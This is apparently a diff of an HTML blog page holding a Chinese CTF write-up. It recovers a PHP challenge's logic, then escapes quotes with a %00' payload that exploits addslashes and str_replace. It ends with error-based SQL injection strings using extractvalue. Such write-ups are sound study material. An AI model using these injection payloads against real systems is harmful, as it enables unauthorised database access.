@@ -232,7 +232,7 @@
 </li>
 <li>JMPZ 在传来的值为0时跳转（注意是传到JMPZ行的值，即~0！！！）<br><img src="/2020/09/27/20-09-27/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-27%20195131.jpg?v=1&amp;type=image" srcset="/img/loading.gif" alt="输入图片描述"><br>这题其他都比较好理解</li>
 </ul>
-<p>分析出的源代码大概逻辑如下：<br><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<p>分析出的源代码大概逻辑如下：<br><div class="hljs"><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
 <span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'do you know Vulcan Logic Dumper?&lt;br&gt;'</span></span>
 <span class="php">$a = $_GET[<span class="hljs-string">'flag1'</span>];</span>
 <span class="php">$b = $_GET[<span class="hljs-string">'flag2'</span>];</span>
@@ -245,8 +245,8 @@
 <span class="php">    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'flase&lt;br&gt;'</span>;</span>
 <span class="php">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'flase&lt;br&gt;'</span>;</span>
 <span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'%3C%21--+index.php.txt+%3F%3E%0D%0A%0D%0A'</span></span>
-<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><br>根据源码构造payload后得到如下显示<br><pre><code class="hljs swift"><span class="hljs-keyword">do</span> you know <span class="hljs-type">Vulcan</span> <span class="hljs-type">Logic</span> <span class="hljs-type">Dumper?</span>  
-the next step <span class="hljs-keyword">is</span> 1chunqiu.<span class="hljs-built_in">zip</span></code></pre><br>下载审计应该是SQL漏洞，由于addslashes函数以及str_replace函数对username中number所含字段的替换，构造出payload: number=0&amp;username=%00’ 从而让单引号逃逸提前闭合查询语句<br><pre><code class="hljs bash"><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from"</span>.<span class="hljs-string">"`"</span>.table_name.<span class="hljs-string">"`"</span>.<span class="hljs-string">"where username="</span>.<span class="hljs-string">"'"</span>.<span class="hljs-string">"<span class="hljs-variable">$username</span>"</span>.<span class="hljs-string">"'"</span></code></pre><br>由于addslashes,username首先变成\0\’，之后str_replace把0替换成空，username就变成了\\’，从而让单引号逃逸<br>进入1chunqiu/login.html尝试填写表单时注入发现不行，直接POST也不行。bp抓包发现POST查询时会变成login.php，直接抓包repeate。<br>回显是sql查询的报错信息，报错注入即可（只写username的值）：</p>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre></div><br>根据源码构造payload后得到如下显示<br><div class="hljs"><pre><code class="hljs swift"><span class="hljs-keyword">do</span> you know <span class="hljs-type">Vulcan</span> <span class="hljs-type">Logic</span> <span class="hljs-type">Dumper?</span>  
+the next step <span class="hljs-keyword">is</span> 1chunqiu.<span class="hljs-built_in">zip</span></code></pre></div><br>下载审计应该是SQL漏洞，由于addslashes函数以及str_replace函数对username中number所含字段的替换，构造出payload: number=0&amp;username=%00’ 从而让单引号逃逸提前闭合查询语句<br><div class="hljs"><pre><code class="hljs bash"><span class="hljs-variable">$sql</span> = <span class="hljs-string">"select * from"</span>.<span class="hljs-string">"`"</span>.table_name.<span class="hljs-string">"`"</span>.<span class="hljs-string">"where username="</span>.<span class="hljs-string">"'"</span>.<span class="hljs-string">"<span class="hljs-variable">$username</span>"</span>.<span class="hljs-string">"'"</span></code></pre></div><br>由于addslashes,username首先变成\0\’，之后str_replace把0替换成空，username就变成了\\’，从而让单引号逃逸<br>进入1chunqiu/login.html尝试填写表单时注入发现不行，直接POST也不行。bp抓包发现POST查询时会变成login.php，直接抓包repeate。<br>回显是sql查询的报错信息，报错注入即可（只写username的值）：</p>
 <ul>
 <li>%00’ and extractvalue(1,concat(0x7e,user(),0x7e))#回显Unknown column ‘x72’ in ‘where clause’</li>
 <li>改成%00’ and extractvalue(1,concat(1,user(),1))#回显user@localhost1，注入应该可行</li>
